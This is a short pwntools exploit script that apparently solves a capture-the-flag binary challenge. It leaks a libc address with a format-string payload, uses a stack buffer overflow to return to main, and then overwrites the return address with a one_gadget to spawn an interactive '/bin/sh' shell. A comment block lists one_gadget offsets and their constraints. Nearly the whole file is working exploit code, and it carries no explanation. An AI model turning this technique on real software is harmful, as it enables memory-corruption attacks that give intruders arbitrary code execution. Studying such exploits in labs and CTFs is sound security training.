from pwn import *
# context.log_level = "debug"
p = process("./main")
elf = ELF("./main")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

payload = "%34$p".ljust(0x48 , "a") + p64(elf.sym["main"])
p.sendlineafter("inputz: \n" , payload)
# hex()
libc_base = eval(p.recvuntil("aaaa" , drop = True)) - 0x5f1168
log.info("libc_base : " + hex(libc_base))
# gdb.attach(p , "format-string-helper")
# pause()
one_gadget = libc_base + 0x45216
payload = "a" * 0x48 + p64(one_gadget)
p.sendlineafter("inputz: \n" , payload)
p.recv()
p.interactive()

"""
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""